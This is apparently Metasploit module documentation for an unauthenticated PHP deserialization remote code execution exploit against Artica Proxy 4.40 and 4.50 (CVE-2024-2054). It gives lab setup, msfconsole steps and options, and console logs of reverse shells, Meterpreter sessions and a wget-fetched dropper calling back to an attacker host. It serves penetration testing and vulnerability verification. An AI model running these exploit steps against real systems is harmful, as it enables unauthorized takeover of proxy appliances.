## Vulnerable Application

A Command Injection vulnerability in Artica Proxy appliance version `4.50` and `4.40`
allows remote attackers to run arbitrary commands via unauthenticated HTTP request.
The Artica Proxy administrative web application will de-serialize arbitrary PHP objects
supplied by unauthenticated users and subsequently enable code execution as the `www-data` user.

This module has been tested with:
* Artica Proxy Appliance 4.50 running in VirtualBox 7.0.14 r161095 (Qt5.15.2)
* Artica Proxy Appliance 4.40 Service Pack 118 running in VirtualBox 7.0.14 r161095 (Qt5.15.2)

## Installation steps to install Artica Proxy appliance
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download the Artica Proxy iso image from [here](https://sourceforge.net/projects/artica-squid/files/ISO/).
* Install the iso image in your virtualization engine.
* When installed, configure the VM appliance to your needs using the menu options.
* Boot up the VM and should be able to access the Artica  appliance.
* Either thru the console, `ssh` on port `22` or via the `webui` via `https://your_articaproxy_ip:9000`.

You are now ready to test the module.

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http//artica_proxy_unauth_rce_cve_2024_2054`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set webshell cuckoo`
- [ ] `set target <0=PHP, 1=Unix Command, 2=Linux Dropper>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### WEBSHELL
You can use this option to set the filename without extension of the webshell.
This is handy if you want to test the webshell upload and execution with different file names.
to bypass any security settings on the Web and PHP server.

### COMMAND
This option provides the user to choose the PHP underlying shell command function to be used for execution.
The choices are `system()`, `passthru()`, `shell_exec()` and `exec()` and it defaults to `passthru()`.
This option is only available when the target selected is either Unix Command or Linux Dropper.
For the native PHP target, by default the `eval()` function will be used for native PHP code execution.

## Scenarios

```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > info

       Name: Artica Proxy Unauthenticated PHP Deserialization Vulnerability
     Module: exploit/linux/http/artica_proxy_unauth_rce_cve_2024_2054
   Platform: PHP, Unix, Linux
       Arch: php, cmd, x64, x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-03-05

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Jaggar Henry of KoreLogic Inc.

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   PHP
      1   Unix Command
      2   Linux Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                        sics/using-metasploit.html
  RPORT      9000             yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The Artica Proxy endpoint URL
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host
  WEBSHELL                    no        Set webshell name without extension. Name will be randomly generated if left un
                                        set.


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t
                                      he local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  1981             yes       The local port to listen on.


  When TARGET is not 0:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  COMMAND  passthru         yes       Use PHP command function (Accepted: passthru, shell_exec, system, exec)

Payload information:

Description:
  A Command Injection vulnerability in Artica Proxy appliance 4.50 and below allows
  remote attackers to run arbitrary commands via unauthenticated HTTP request.
  The Artica Proxy administrative web application will deserialize arbitrary PHP objects
  supplied by unauthenticated users and subsequently enable code execution as the "www-data" user.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2024-2054
  https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054
  https://packetstormsecurity.com/files/177482


View the full module info with the info -d command.
```

### Target 0 - PHP native `php/meterpreter/reverse_tcp` session
```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set webshell cuckoo
webshell => cuckoo
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set target 0
target => 0
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set rhosts 192.168.201.4
rhosts => 192.168.201.4
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.4:9000 can be exploited.
[+] The target is vulnerable. Artica version: 4.50
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 192.168.201.4
[+] Deleted /usr/share/artica-postfix/wizard/cuckoo.php
[*] Meterpreter session 15 opened (192.168.201.8:4444 -> 192.168.201.4:33986) at 2024-03-15 17:46:04 +0000

meterpreter > sysinfo
Computer    : artica-applianc
OS          : Linux artica-applianc 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
meterpreter >
```
### Target 1 - Unix Command `cmd/unix/reverse_bash` session
```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set target 1
target => 1
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.4:9000 can be exploited.
[+] The target is vulnerable. Artica version: 4.50
[*] Executing Unix Command for cmd/unix/reverse_bash
[+] Deleted /usr/share/artica-postfix/wizard/cuckoo.php
[*] Command shell session 16 opened (192.168.201.8:4444 -> 192.168.201.4:46286) at 2024-03-15 17:48:40 +0000

uname -a
Linux artica-applianc 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Target 2 - Linux Dropper `linux/x64/meterpreter/reverse_tcp` session
```msf
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set target 2
target => 2
msf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.4:9000 can be exploited.
[+] The target is vulnerable. Artica version: 4.50
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://192.168.201.8:1981/U835crbue3yBo
[*] Client 192.168.201.4 (Wget/1.20.1 (linux-gnu)) requested /U835crbue3yBo
[*] Sending payload to 192.168.201.4 (Wget/1.20.1 (linux-gnu))
[*] Sending stage (3045380 bytes) to 192.168.201.4
[+] Deleted /usr/share/artica-postfix/wizard/cuckoo.php
[*] Meterpreter session 17 opened (192.168.201.8:4444 -> 192.168.201.4:35246) at 2024-03-15 17:50:04 +0000
[*] Command Stager progress - 100.00% done (119/119 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : artica-applianc.domain.tld
OS           : Debian 10.13 (Linux 4.19.0-24-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: www-data
meterpreter >
```

## Limitations
No limitations.
